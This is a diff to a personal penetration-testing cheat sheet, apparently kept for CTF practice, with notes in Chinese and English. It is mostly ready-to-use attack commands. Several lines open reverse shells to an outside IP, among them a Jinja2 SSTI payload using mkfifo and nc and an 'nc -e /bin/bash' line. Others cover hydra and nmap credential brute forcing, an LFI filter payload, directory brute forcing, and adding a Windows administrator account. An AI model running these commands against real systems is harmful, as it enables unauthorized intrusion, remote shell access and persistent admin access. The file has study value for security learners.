@@ -17,7 +17,11 @@ nmap -p80 hostip --script=http-brute  --script-args userdb=wordlist.txt,passdb=p
 hydra  -L user.txt -P pass.txt -s port -f hostip http-get /uri   也可以破解http authenication 认证
 
 "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+export xterm=TERM
+ctrl+z
+stty raw -echo; fg
 
+ssti get jinja2 shell:"{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.9.171.166 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}"
 php://filter/convert.base64-encode/resource=index
 
 ssh username@ipadderss -p port
@@ -35,7 +39,7 @@ find / -perm ug=rwx 2>/dev/null
 cewl url://ip/index.txt -w wordlist.txt 将一个网页上的字符生成密码字典
 
 gobuster -w -q -p  http://ip/index.php -e txt php jsp css ..
-
+feroxbuster -t 10 -u https://www.example.com -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -x py,html,txt -o feroxbuster 
 
 nc -lvp (192.168.0.1) 4444
 nc 192.168.0.1 4444 -e /bin/bash  连接到192.168.0.1 4444 并弹一个shell给192.168.0.1
@@ -63,6 +67,7 @@ vim chrome.sh  << /usr/bin/google-chrome-stable %U --no-sandbox --user-data-dir 
 chmod +x chrome.sh 
 ./chrome.sh
 
+curl https://www.examples.com -k  -k参数免于访问证书
 
 windows search file use dos command line: c: dir /s /p filename
 
@@ -116,3 +121,13 @@ Windows系统增加用户的命令
 net user <username> <password> /add
 
 net localgroup administrators <username> /add
+msconfig :系统配置
+compmgmt.exe：计算机管理
+resmon.exe:资源管理
+msinfo32.exe: 系统信息
+control.exe: 控制面板   control /name microsoft.windowsupdate windos更新
+useraccountcontrolsetting.exe:用户故障诊断
+lusrmgr.msc：用户管理
+appwiz.cpl:安装删除程序
+taskmgr ：任务管理器
+wf.msc :防火墙 
